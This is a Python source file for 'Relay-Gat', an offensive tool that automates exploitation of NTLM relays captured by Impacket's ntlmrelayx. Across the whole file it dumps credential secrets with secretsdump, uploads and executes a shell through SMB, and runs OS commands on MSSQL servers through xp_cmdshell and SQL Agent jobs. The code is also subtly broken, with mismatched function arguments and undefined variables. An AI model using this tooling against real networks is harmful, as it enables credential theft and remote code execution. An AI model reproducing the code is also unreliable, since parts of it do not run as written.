#!/usr/bin/env python3
# impacket_relay_gat.py
# Authors: ad0nis (Aaron Pohl) & fin3ss3g0d (Dylan Evans)

import sys
import requests
from subprocess import run, PIPE
import concurrent.futures
import argparse
from datetime import datetime


def main():
    print_banner()
    # Create the parser
    parser = argparse.ArgumentParser(description='Relay-Gat: A tool to automate the exploitation of ntlmrelayx relays.')

    # Add the 'threads' argument
    # The type is set to int to make sure the input is an integer
    # The default value is set to 10
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads to use')    
    # Add Boolean arguments
    parser.add_argument('--smb-shares', action='store_true', help='Enable listing of SMB shares')
    parser.add_argument('--smb-shell', action='store_true', help='Enable execution of SMB shell')
    parser.add_argument('--dump-secrets', action='store_true', help='Enable dumping of secrets')
    parser.add_argument('--mssql-dbs', action='store_true', help='Enable listing of MSSQL databases')
    parser.add_argument('--mssql-exec', action='store_true', help='Enable execution of MSSQL OS commands via xp_cmdshell & sp_start_job')    
    # Add integer argument for the MSSQL exec method
    parser.add_argument('--mssql-method', type=int, choices=[1, 2, 3], help='''Method to use for MSSQL exec:
                                                                            1 - Uses xp_cmdshell for command execution.
                                                                            2 - Uses sp_start_job to start a SQL Server Agent job.
                                                                            3 - Enables xp_cmdshell, executes the command, and then disables xp_cmdshell. 
                                                                            Warning: Method 3 can potentially leave xp_cmdshell enabled or disable it if the system was relying on it.''')                                 
    # Add string arguments
    parser.add_argument('--mssql-command', type=str, help='Command to execute for MSSQL exec method (OS command NOT SQL query)')
    parser.add_argument('--shell-path', type=str, help='File path for the SMB shell option')

    # Parse the arguments
    args = parser.parse_args()

    # Validate the arguments
    validate_arguments(args)

    # Make a request for the relay info against localhost
    relay_info = get_relay_info()
    # Handles each protocol ntlmrelayx supports and runs appropriate exploits based on selections
    handle_relay_info(relay_info)


def validate_arguments(args):
    # Check for at least one action argument
    if not args.smb_shares and not args.smb_shell and not args.dump_secrets and not args.mssql_dbs and not args.mssql_exec:
        print("Error: At least one action argument is required.")
        sys.exit(1)

    # Check for SMB shell argument dependency
    if args.smb_shell and not args.shell_path:
        print("Error: --shell-path is required when --smb-shell is selected.")
        sys.exit(1)
    
    # Check for MSSQL exec argument dependencies
    if args.mssql_exec:
        if not args.mssql_command:
            print("Error: --mssql-command is required when --mssql-exec is selected.")
            sys.exit(1)
        if args.mssql_method is None:
            print("Error: --mssql-method is required when --mssql-exec is selected.")
            sys.exit(1)


def print_banner():
    print('''⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⡀⣈⡉⠻⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀.___                            __           __   ⠀
⠀⢀⣾⣧⣉⠁⣠⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|   | _____ ___________    ____|  | __ _____/  |_ ⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡟⢸⣷⡀⠀⣀⣀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀|   |/     \\____ \__  \ _/ ___\|  |/ // __ \   __\⠀⠀
⠀⠈⢿⣿⣿⣿⣿⣿⣿⡟⢁⣾⣿⣿⣦⠈⢿⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀|   |  Y Y  \  |_> > __ \\  \___|    <\  ___/|  |  ⠀⠀
⠀⠀⠀⠙⠛⠛⠛⠛⢉⣴⣿⣿⣿⣿⣿⠇⢸⠀⠁⠶⢀⡀⠀⠀⠀⠀⠀⠀|___|__|_|  /   __(____  /\___  >__|_ \\___  >__|  ⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣉⡉⠙⠛⢁⣠⣿⠀⡇⣴⠄⣁⠀⠀⠀⠀⠀⠀⠀         \/|__|       \/     \/     \/    \/      ⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠀⠑⢠⡤⢉⠀⠀⠀⠀⠀⠀⠀__________       .__                               ⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢀⣄⠉⢉⣠⠈⠛⠒⣤⡈⠛⠀⠀⠀⠀⠀⠀\______   \ ____ |  | _____  ___.__.               ⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠋⠀⡄⢻⣧⠀⠀⠈⣴⠙⣂⠀⠀⠀⠀⠀ |       _// __ \|  | \__  \<   |  |               ⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠃⠀⠀⢸⡄⠹⣇⠀⠀⢠⣦⠈⡁⠀⠀⠀⠀ |    |   \  ___/|  |__/ __ \\___  |               ⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠁⠀⠀⠀⠀⠟⠀⠹⣆⠀⠀⠠⣦⠈⣀⠀⠀⠀ |____|_  /\___  >____(____  / ____|               ⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣆⠀⠀⠀⣶⠄⠀⠀⠀⠀       \/     \/          \/\/                    
⠀⠀⠀⠀⠀⠀⠀⠈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠁⠀⠀⠀⠶⠀⣠⡀⠀    ________        __                               
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀   /  _____/_____ _/  |_                             
"He taught me how to driveby."  /   \  ___\__  \\   __\                            
                                \    \_\  \/ __ \|  |                              
 By ad0nis (Aaron Pohl)          \______  (____  /__|                              
 and fin3ss3g0d (Dylan Evans)           \/     \/                                  
 ''')


def get_current_datetime_string():
    """Returns the current date and time as a formatted string."""
    current_datetime = datetime.now()
    datetime_string = current_datetime.strftime('%Y-%m-%d %H:%M:%S')
    return datetime_string


def log_output(file_path, technique, relay_user, relay_host, relay_port, *data_entries):
    """
    Logs data entries to a specified file with a timestamp, relay details,
    and checks if multiple data entries exist before appending newlines.
    
    Parameters:
    - file_path: The path to the log file.
    - technique: The technique used for the relay attack.
    - relay_user: The user used in the relay attack.
    - relay_host: The host used in the relay attack.
    - relay_port: The port used in the relay attack.
    - data_entries: Variable number of data strings to be logged.
    """
    # Combine data entries with newlines if there are multiple entries
    combined_data = "\n".join(data_entries) if len(data_entries) > 1 else "".join(data_entries)
    
    # Print the data to the console
    print(combined_data)

    with open(file_path, 'a+', encoding=sys.getfilesystemencoding(), errors='replace') as file:
        file.seek(0)  # Move the file pointer to the start of the file.
        first_char = file.read(1)  # Try to read the first character to determine if the file is empty.

        header = f"Performing {technique} with user {relay_user} against {relay_host}:{relay_port} at {get_current_datetime_string()}\n"
        
        if not first_char:
            # File is empty. Write the initial timestamp, details, and data.
            file.write(header)
            file.write(combined_data)
        else:
            # File is not empty. Append new timestamp, details, and data.
            file.seek(0, 2)  # Ensure the file pointer is at the end for appending.
            file.write(f"\n{header}")
            file.write(combined_data)


def get_relay_info():
    # Basic test to get relay info for testing:
    # curl -v http://localhost:9090/ntlmrelayx/api/v1.0/relays | python -m json.tool
    url = 'http://localhost:9090/ntlmrelayx/api/v1.0/relays'
    print(f"Attempting to retrieve list of active relays from '{url}'.")
    print("Please ensure that you have ntlmrelayx.py running with active relays showing in 'socks' command output.")
    try:
        response = requests.get(url)
        values = response.json()
        return(values)
    except Exception as error:
        print(f"Error: '{error}' while gathering relay info from '{url}'.\nCannot proceed without relay info. Are you sure you have ntlmrelayx running?")
        sys.exit(1)


def list_shares(relay_user, relay_host, relay_port, is_admin):
    # echo "shares\nuse C$\nls\nexit\n" | proxychains smbclient.py -no-pass DOMAIN/USERNAME@1.2.3.4
    connection_string = relay_user + "@" + relay_host
    input = ''
    if is_admin == "TRUE":
        input = "shares\nuse C$\nls\nexit\n"
    else:
        input = "shares\nexit\n"
    print(f"Attempting to list SMB shares as '{connection_string}'.")
    try:
        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE, input=input, encoding='ascii')
        file_path = f'smb_shares.{relay_user.replace("/", ".")}.{relay_host}.txt'
        log_output(file_path, "--smb-shares", relay_user, relay_host, relay_port, proc.stdout)
    except Exception as error:
        print(f"Error: '{error}' listing SMB shares as '{connection_string}'.")


def smb_shell(relay_user, relay_host, relay_port, shell_path):
    connection_string = f"{relay_user}@{relay_host}"
    input1 = f"shares\nuse C$\nls\ncd Users\\Public\nput {shell_path}\nls\nexit\n"
    input2 = f"C:\\Users\\Public\\{shell_path}\nexit\n"

    output = []  # Collect output from both commands

    # Attempt to run first command
    try:
        print(f"Attempting to upload {shell_path} to C:\\Users\\Public\\{shell_path} as '{connection_string}'.")
        proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE, input=input1, encoding='ascii')
        output.append(proc.stdout)
    except Exception as error:
        print(f"Error during smbclient.py operation: {error}")

    # Attempt to run second command
    try:
        print(f"Attempting to smbexec C:\\Users\\Public\\{shell_path} as '{connection_string}'.")
        proc2 = run(['proxychains', 'smbexec.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE, input=input2, encoding='ascii')
        output.append(proc2.stdout)
    except Exception as error:
        print(f"Error during smbexec.py operation: {error}")

    # Log the output if any command succeeded
    if output:
        file_path = f'smb_shell.{relay_user.replace("/", ".")}.{relay_host}.txt'
        log_output(file_path, "--smb-shell", relay_user, relay_host, relay_port, *output)
    else:
        print("No output to log due to errors in both smb_exec commands.")


def secretsdump(relay_user, relay_host):
    connection_string = relay_user + "@" + relay_host
    out_user = relay_user.replace('/', '.')
    outfile = f"secretsdump.{out_user}.{relay_host}.txt"
    print(f"Attempting secretsdump.py as '{connection_string}'.")
    try:
        proc = run(['proxychains', 'secretsdump.py', '-ts', '-no-pass', '-o', outfile, connection_string], stdout=PIPE, input='', encoding='ascii')
        print(proc.stdout)
    except Exception as error:
        print(f"Error: '{error}' dumping secrets from '{connection_string}'.")


def mssql_exec(relay_user, relay_host, relay_port, method, command):
    connection_string = relay_user + "@" + relay_host
    if method == 1:
        input = "xp_cmdshell " + command + "\n"
    elif method == 2:
        input = "sp_start_job " + command + "\n"
    elif method == 3:
        print("[!] Warning! mssql_exec method 3 automatically enables xp_cmdshell, executes a command, and then disables xp_cmdshell.")
        print("[!] If this does not happen cleanly, it could leave xp_cmdshell enabled, or if the system was relying on xp_cmdshell, it could now be disabled.")
        print('[!] This is not a recommended method, and could cause havoc.')
        input = "enable_xp_cmdshell\nxp_cmdshell " + command + "\ndisable_xp_cmdshell\n"
    try:
        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE, input=input, encoding='ascii')
        file_path = f'mssql_exec.{relay_user.replace("/", ".")}.{relay_host}.txt'
        log_output(file_path, f"--mssql-exec method {method}", relay_user, relay_host, relay_port, proc.stdout)
    except Exception as error:
        print(f"Error: '{error}' executing command '{command}' as '{connection_string}'.")


def list_databases(relay_user, relay_host, relay_port):
    connection_string = relay_user + "@" + relay_host
    input = 'SELECT CURRENT_USER;\nSELECT name FROM master.sys.databases;\nexit\n'
    print(f"Attempting to list current db user and MSSQL databases as '{connection_string}'.")
    try:
        proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE, input=input, encoding='ascii')
        file_path = f'mssql_databases.{relay_user.replace("/", ".")}.{relay_host}.txt'
        log_output(file_path, "--mssql-dbs", relay_user, relay_host, relay_port, proc.stdout)
    except Exception as error:
        print(f"Error: '{error}' listing MSSQL databases as '{connection_string}'.")


def handle_relay_info(relay_info, args):
    # example SMB: ["SMB", "1.2.3.4", "domain/user", "TRUE", "445"]
    # example MSSQL: ["MSSQL", "1.2.3.4", "DOMAIN/user", "N/A", "60183"]

    # Initialize the ThreadPoolExecutor
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=args.threads)

    for relay in relay_info:
        # Break it up into usable bits...
        protocol = relay[0]
        relay_host = relay[1]
        relay_user = relay[2]
        is_admin = relay[3]
        relay_port = relay[4]

        if protocol == 'SMB' and args.dump_secrets:
            if is_admin != 'TRUE':
                print(f"Warning: secretsdump requires admin privileges. Skipping '{relay_user}'.")
            else:
                # SMB and local admin, so we can dump secrets
                executor.submit(secretsdump, relay_user, relay_host)
        if protocol == 'SMB' and args.smb_shares:
            executor.submit(list_shares, relay_user, relay_host, relay_port, is_admin)
        if protocol == 'SMB' and args.smb_shell:
            executor.submit(smb_shell, relay_user, relay_host, relay_port, args.shell_path)
        if protocol == 'MSSQL' and args.mssql_dbs:
            executor.submit(list_databases, relay_user, relay_host, relay_port)
        if protocol == 'MSSQL' and args.mssql_exec:
            executor.submit(mssql_exec, relay_user, relay_host, relay_port, method, command)


if __name__ == '__main__':
    main()
